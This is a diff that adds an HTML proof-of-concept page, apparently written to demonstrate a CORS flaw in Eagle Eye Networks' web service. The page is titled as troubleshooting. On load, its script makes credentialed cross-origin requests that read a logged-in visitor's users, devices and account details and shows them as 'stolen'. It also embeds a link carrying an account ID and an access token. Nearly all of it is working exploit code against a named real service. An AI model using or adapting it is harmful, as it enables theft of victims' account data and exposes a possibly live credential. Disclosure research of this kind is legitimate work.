@@ -1,0 +1,87 @@
+<html>
+	<head>
+		<title>I am getting all your information</title>
+		<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+  crossorigin="anonymous"></script>
+  		<style>
+  			h1 {
+  				color: blue
+  			}
+  		</style>
+	</head>
+
+	<body>
+		<H1>EAGLE EYE NETWORKS - Troubleshooting</h1>
+		<div style="font-family:monospace" class="debug">
+			<div class="users"><h4> Stole these users</h4></div>
+		</div>
+		<div style="font-family:monospace" class="debug">
+			<div class="devices"><h4> Stole these devices</h4></div>
+		</div>
+		<div style="font-family:monospace" class="debug">
+			<div class="userinfo"><h4> Stole these devices</h4><pre></pre></div>
+		</div>
+
+	</body>
+	<script type="text/javascript">
+		var url = 'https://login.eagleeyenetworks.com/';
+		
+		function stealit() {
+			var invocation = new XMLHttpRequest();
+			invocation.open('GET', url + "g/list/users", true);
+			invocation.withCredentials = true;
+			invocation.onreadystatechange = function() {
+				if (invocation.status === 200) {
+					var userInfos = [];
+					var myArr = JSON.parse(this.responseText);
+					for(var i = 0; i < myArr.length; i++) {
+						rec = myArr[i];
+						var name = rec[0] + ' ' + rec[1] + ' ' + rec[2] + ' ' + rec[3];
+						userInfos.push(name);
+					}
+					$('.debug .users').append(userInfos.join("<br>"));
+				} 
+			
+			}
+			invocation.send();
+			
+		}		
+		function stealit_devs() {
+			var invocation = new XMLHttpRequest();
+			invocation.open('GET', url + "g/list/devices", true);
+			invocation.withCredentials = true;
+			invocation.onreadystatechange = function() {
+				if (invocation.status === 200) {
+					var userInfos = [];
+					var myArr = JSON.parse(this.responseText);
+					for(var i = 0; i < myArr.length; i++) {
+						rec = myArr[i];
+						var name = rec[0] + ' ' + rec[1] + ' ' + rec[2] + ' ' + rec[3];
+						userInfos.push(name);
+					}
+					$('.debug .devices').append(userInfos.join("<br>"));
+				}
+			}
+			invocation.send();
+		}		
+		function steal_info() {
+			var invocation = new XMLHttpRequest();
+			invocation.open('GET', url + "g/user", true);
+			invocation.withCredentials = true;
+			invocation.onerror = function() {
+				$('.debug .users').append('Blocked by CORS <a href="https://c001.eagleeyenetworks.com/static/drivefs/index.html?account_id=00010760&dfs_token=71c3a5d7-0b31-4d2f-a27c-c2354928f234">See what happens when CORS is not limited</a>');
+			}
+			invocation.onreadystatechange = function() {
+				if (invocation.status === 200) {
+					$('.debug .userinfo pre').text(invocation.responseText);
+				}
+			}
+			invocation.send();
+		}
+		stealit();
+		stealit_devs();
+		steal_info();
+		
+	</script>
+
+</html>
